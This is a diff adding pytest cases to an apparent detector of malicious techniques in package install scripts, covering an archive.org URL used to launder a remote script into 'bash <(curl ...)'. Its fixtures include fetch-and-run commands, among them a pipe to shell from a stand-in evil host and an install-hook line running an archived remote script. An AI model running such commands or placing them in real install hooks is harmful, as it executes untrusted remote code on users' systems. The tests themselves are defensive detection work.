@@ -512,3 +512,39 @@ def test_the_payload_after_all_of_them_is_still_read():
             "+  command -v tar >/dev/null\n"
             "+  ${A[0]} https://evil.example | sh\n }\n")
     assert "X002" in set(crossfire_techniques(diff))
+
+
+# ---------------------------------------------------------------------------
+# X034: an archival service used as a redirector.
+# ---------------------------------------------------------------------------
+
+ARCHIVE = ("https://web.archive.org/web/"
+           "https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh")
+
+
+def test_x034_claims_an_archive_url_laundered_into_an_executor():
+    assert "X034" in _fire(f"bash <(curl -L '{ARCHIVE}' 2>/dev/null)")
+
+
+@pytest.mark.parametrize("label,command", [
+    # A recipe that pins a vanished upstream through the archive spells one
+    # URL and fetches it into a file: no executor, so no laundering claim.
+    ("legit-archived-source",
+     'source=("https://web.archive.org/web/2023/'
+     'https://github.com/a/b/archive/v1.tar.gz")'),
+    ("fetch-to-file", f"curl -L '{ARCHIVE}' -o x.tar.gz"),
+    # A plain fetch piped into a shell is R001/R002's, not X034's.
+    ("plain-pipe-to-shell", f"curl -L '{ARCHIVE}' | bash"),
+    # The indirection is the point: a non-archive process substitution is
+    # not this technique.
+    ("no-archive-index", "bash <(curl 'https://evil.example/x.sh')"),
+])
+def test_x034_is_silent_when_the_archive_is_not_laundering_code(label, command):
+    assert "X034" not in _fire(command), label
+
+
+def test_x034_reads_the_committed_install_hook():
+    """The campaign payload rides in an added `.install`, not the recipe."""
+    diff = ("--- /dev/null\n+++ b/ay.install\n@@ -0,0 +1,2 @@\n"
+            f"+  bash <(curl -L '{ARCHIVE}' 2>/dev/null)\n")
+    assert "X034" in set(crossfire_techniques(diff))
